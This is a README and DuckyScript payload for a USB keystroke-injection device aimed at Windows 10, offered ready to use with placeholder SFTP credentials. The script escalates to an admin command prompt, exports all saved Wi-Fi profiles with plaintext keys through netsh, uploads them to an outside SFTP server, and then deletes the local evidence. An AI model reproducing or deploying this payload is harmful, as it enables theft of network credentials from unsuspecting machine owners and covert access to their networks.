## Change the following things;
* **SFTPpass** : Your **Sftp password**
* **SFTPusername** : Your **sftp username**
* **SFTPserver** : Your **sftp server address**


## Succesfully tested on;
* Windows 10

## Info;
* Author : lucagrosshennig
* Duckncoder : 1.2 
* Target : Windows 10 Machines 
* my Webseite : [lucagrosshennig.club](lucagrosshennig.club) 
* my github : [github.com/lucagrosshennig](github.com/lucagrosshennig) 
* Description : Connect to sftp server and uploads WLAN passwords 

```
DELAY 500
GUI r
DELAY 300
STRING cmd 
DELAY 300
CTRL-SHIFT ENTER
DELAY 300
LEFTARROW
DELAY 100
ENTER 
DELAY 300
STRING cd C:\
ENTER
DELAY 100
STRING md l 
ENTER
DELAY 100
STRING cd l && @netsh wlan export profile key=clear >nul
ENTER
DELAY 1000
STRING sftp -oPort=22 **SFTPusername**@**SFTPserver**
ENTER
DELAY 1200
STRING **SFTPpassword**
DELAY 70
ENTER
DELAY 500
STRING cd wlan
ENTER
DELAY 50
STRING mput C:\l\*.xml
ENTER
DELAY 3000
STRING bye
ENTER
DELAY 200
STRING cd ..
ENTER 
DELAY 50
STRING del "C:\l"
ENTER
DELAY 50
STRING j
ENTER
STRING exit
ENTER
```